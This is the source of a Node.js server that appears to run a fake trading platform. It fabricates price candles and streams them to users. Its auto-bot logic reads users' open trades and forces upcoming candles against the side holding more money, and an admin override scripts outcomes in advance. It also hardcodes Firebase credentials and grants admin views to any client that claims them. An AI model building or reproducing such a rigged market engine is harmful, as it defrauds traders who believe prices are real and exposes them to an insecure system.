const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 300; 
const TIMEFRAME = 60000; 
const TICK_MS = 200;
const MIN_PRICE = 0.00001;

const markets = {}; 
let activeTradesData = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

db.ref('admin/markets').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    activeTradesData = {};
    Object.keys(data).forEach(marketId => {
        activeTradesData[marketId] = data[marketId].activeTrades || {};
        if (!markets[marketId] && data[marketId].status !== 'inactive') {
            initializeNewMarket(marketId);
        }
    });
});

function safeGetClose(marketData) {
    if (marketData && marketData.liveCandle && !isNaN(marketData.liveCandle.close)) return marketData.liveCandle.close;
    if (marketData && marketData.history && marketData.history.length > 0) return marketData.history[marketData.history.length - 1].close;
    return 1.25000;
}

function generateCandle(timestamp, openPrice, forcedColor = null) {
    if (isNaN(openPrice)) openPrice = 1.25000;
    const baseVol = openPrice * 0.00006;
    const bodySize = baseVol * (0.5 + Math.random());
    
    let isGreen;
    if (forcedColor === 'GREEN') isGreen = true;
    else if (forcedColor === 'RED') isGreen = false;
    else isGreen = Math.random() > 0.5;

    let targetClose = isGreen ? openPrice + bodySize : openPrice - bodySize;
    targetClose = roundPrice(targetClose);
    
    const wickMax = Math.abs(targetClose - openPrice) * 0.5 + (openPrice * 0.00003);
    const high = roundPrice(Math.max(openPrice, targetClose) + (Math.random() * wickMax));
    const low = roundPrice(Math.min(openPrice, targetClose) - (Math.random() * wickMax));

    return { timestamp, open: roundPrice(openPrice), close: targetClose, high, low, color: isGreen ? 'GREEN' : 'RED' };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.25000; 
    
    try {
        const snap = await db.ref(`markets/${path}/live`).once('value');
        if (snap.exists() && snap.val().price && !isNaN(snap.val().price)) startPrice = snap.val().price;
    } catch (e) { }

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let lastClose = startPrice;

    for (let i = MAX_CANDLES; i > 0; i--) {
        let c = generateCandle(nowPeriod - (i * TIMEFRAME), lastClose);
        candles.unshift(c);
        lastClose = c.close;
    }
    candles[candles.length - 1].close = startPrice; 

    let futureQueue = [];
    let futureStartPrice = startPrice;
    for(let i = 1; i <= 6; i++) {
        let fc = generateCandle(nowPeriod + (i * TIMEFRAME), futureStartPrice);
        futureQueue.push(fc);
        futureStartPrice = fc.close;
    }
    
    markets[marketId] = {
        marketId, marketPath: path, history: candles, 
        futureQueue: futureQueue, liveCandle: null,
        mode: 'AUTO', manualCandlesLeft: 0, manualCooldownUntil: 0, noise: 0
    };
    console.log(`Initialized Market: ${marketId}`);
}

function applyAutoBotLogic(market) {
    if (market.mode === 'MANUAL') return;

    let upVolume = 0, dnVolume = 0;
    const trades = activeTradesData[market.marketId] || {};
    
    Object.values(trades).forEach(trade => {
        if (trade.direction === 'UP') upVolume += parseFloat(trade.amount);
        if (trade.direction === 'DOWN') dnVolume += parseFloat(trade.amount);
    });

    if (upVolume === 0 && dnVolume === 0) return;

    let targetColor = upVolume > dnVolume ? 'RED' : 'GREEN'; 
    let tempStartPrice = market.futureQueue[0].open;
    for(let i = 0; i < market.futureQueue.length; i++) {
        let forced = (i >= 2) ? targetColor : null; 
        market.futureQueue[i] = generateCandle(market.futureQueue[i].timestamp, tempStartPrice, forced);
        tempStartPrice = market.futureQueue[i].close;
    }
}

function processMarketTick(marketData, currentPeriod) {
    if (!marketData || !marketData.futureQueue || marketData.futureQueue.length === 0) return;

    const now = Date.now();
    
    if (!marketData.liveCandle || marketData.liveCandle.timestamp !== currentPeriod) {
        if (marketData.liveCandle) {
            marketData.history.push({ ...marketData.liveCandle });
            if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        }

        let targetCandle = marketData.futureQueue.shift();
        
        // This is the failsafe for the black screen issue
        if (!targetCandle) {
            targetCandle = generateCandle(currentPeriod, safeGetClose(marketData));
        }
        targetCandle.timestamp = currentPeriod;
        
        marketData.liveCandle = { 
            timestamp: currentPeriod, open: targetCandle.open, 
            high: targetCandle.open, low: targetCandle.open, 
            close: targetCandle.open, targetClose: targetCandle.close, 
            targetHigh: targetCandle.high, targetLow: targetCandle.low
        };

        let lastFuturePrice = marketData.futureQueue.length > 0 
            ? marketData.futureQueue[marketData.futureQueue.length - 1].close : targetCandle.close;
        
        let newFutureTimestamp = currentPeriod + (6 * TIMEFRAME);
        marketData.futureQueue.push(generateCandle(newFutureTimestamp, lastFuturePrice));

        if (marketData.mode === 'MANUAL') {
            marketData.manualCandlesLeft--;
            if (marketData.manualCandlesLeft <= 0) {
                marketData.mode = 'AUTO';
                db.ref(`admin/manual_status/${marketData.marketId}`).update({ status: 'AUTO' });
            }
        } else {
            applyAutoBotLogic(marketData);
        }
        marketData.noise = 0;
    }

    const live = marketData.liveCandle;
    const timeElapsed = now - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    const expectedBasePath = live.open + ((live.targetClose - live.open) * progress);
    const noiseMax = Math.abs(live.targetClose - live.open) * 0.20 * (1 - progress); 
    marketData.noise += (Math.random() - 0.5) * noiseMax;
    if (Math.abs(marketData.noise) > noiseMax) marketData.noise *= 0.5;

    let newPrice = expectedBasePath + marketData.noise;

    if (progress > 0.2 && progress < 0.8) {
        if (Math.random() < 0.05) newPrice = live.targetHigh;
        else if (Math.random() < 0.05) newPrice = live.targetLow;
    }
    if (progress >= 0.97) newPrice = live.targetClose; 

    if (isNaN(newPrice)) newPrice = live.open;

    live.close = roundPrice(newPrice);
    live.high = roundPrice(Math.max(live.high, live.close, newPrice));
    live.low = roundPrice(Math.min(live.low, live.close, newPrice));
}

function broadcastData(marketId) {
    const market = markets[marketId];
    if(!market || !market.liveCandle) return;

    const userPayload = JSON.stringify({ 
        market: marketId, 
        candle: { timestamp: market.liveCandle.timestamp, open: market.liveCandle.open, high: market.liveCandle.high, low: market.liveCandle.low, close: market.liveCandle.close }, 
        serverTime: Date.now() 
    });

    const adminPayload = JSON.stringify({
        type: 'admin_sync', market: marketId,
        liveCandle: market.liveCandle, futureQueue: market.futureQueue,
        mode: market.mode, cooldownUntil: market.manualCooldownUntil
    });

    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(client.isAdmin ? adminPayload : userPayload);
        }
    });
}

db.ref('admin/manual_override').on('child_added', (snapshot) => {
    const data = snapshot.val();
    if (data && markets[data.marketId]) {
        let market = markets[data.marketId];
        const now = Date.now();
        
        if (now > market.manualCooldownUntil) {
            market.mode = 'MANUAL';
            market.manualCandlesLeft = 6;
            
            const lockTime = now + (21 * 60 * 1000); 
            market.manualCooldownUntil = lockTime;
            
            let tempStart = safeGetClose(market);
            let currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
            
            // Build the future queue based on admin directions
            let newFutureQueue = [];
            for(let i=0; i<6; i++) {
                let forceColor = data.directions[i] === 'UP' ? 'GREEN' : 'RED';
                let newCandle = generateCandle(currentPeriod + ((i+1)*TIMEFRAME), tempStart, forceColor);
                newFutureQueue.push(newCandle);
                tempStart = newCandle.close;
            }
            market.futureQueue = newFutureQueue;

            db.ref(`admin/manual_status/${data.marketId}`).set({ 
                status: 'MANUAL', cooldownUntil: lockTime 
            });
        }
        snapshot.ref.remove();
    }
});

app.get('/api/history/:market', (req, res) => {
    const marketId = req.params.market;
    if (markets[marketId]) res.json(markets[marketId].history);
    else res.json([]);
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                ws.isAdmin = msg.isAdmin || false; 
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history }));
                    if(ws.isAdmin && markets[msg.market].liveCandle) {
                        ws.send(JSON.stringify({
                            type: 'admin_sync', market: msg.market,
                            liveCandle: markets[msg.market].liveCandle, futureQueue: markets[msg.market].futureQueue,
                            mode: markets[msg.market].mode, cooldownUntil: markets[msg.market].manualCooldownUntil
                        }));
                    }
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        processMarketTick(markets[marketId], currentPeriod);
        broadcastData(marketId);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.liveCandle) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.liveCandle.close, timestamp: m.liveCandle.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Admin Server V3.2 Running (Crash Fixed)'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));